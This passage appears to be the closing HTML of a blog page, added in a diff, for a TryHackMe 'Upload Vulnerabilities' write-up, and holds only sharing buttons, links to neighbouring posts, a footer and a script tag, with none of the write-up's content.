+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=THM%3a%20Upload%20Vulnerabilities%20--%20Write-Up%20https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f04%2fthm-upload-vulnerabilities--write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f04%2fthm-upload-vulnerabilities--write-up%2f&amp;t=THM%3a%20Upload%20Vulnerabilities%20--%20Write-Up" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=THM%3a%20Upload%20Vulnerabilities%20--%20Write-Up&amp;url=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f04%2fthm-upload-vulnerabilities--write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://robscharf.github.io/posts/2022/05/how-to-add-a-backtick-hotkey-to-windows-10/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">How-to: Add a backtick hotkey to Windows 10</span>
+                </a>
+            </span>
+            
+
+            
+            <span class="button next">
+                <a href="https://robscharf.github.io/posts/2022/04/finishing-the-owasp-juice-shop-xss/">
+                    <span class="button__text">Finishing the OWASP Juice Shop XSS</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2022</span>
+            <a href="https://robscharf.github.io//colophon">&#9829;</a>
+            
+        </div>
+    </div>
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            
+        </div>
+    </div>
+</footer>
+  
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://robscharf.github.io/bundle.min.cf7fb2a9e24608a783e05e4472da2fdf008293289de1ad88d1cba5c143e7e414496dd33b6a228e92f8461ce0c8cbad3c9f9847e73e46dfbce0463393ddd1733a.js" integrity="sha512-z3&#43;yqeJGCKeD4F5Ectov3wCCkyid4a2I0culwUPn5BRJbdM7aiKOkvhGHODIy608n5hH5z5G37zgRjOT3dFzOg=="></script>
+<script></script>  
+
+
+    </body>
+</html>
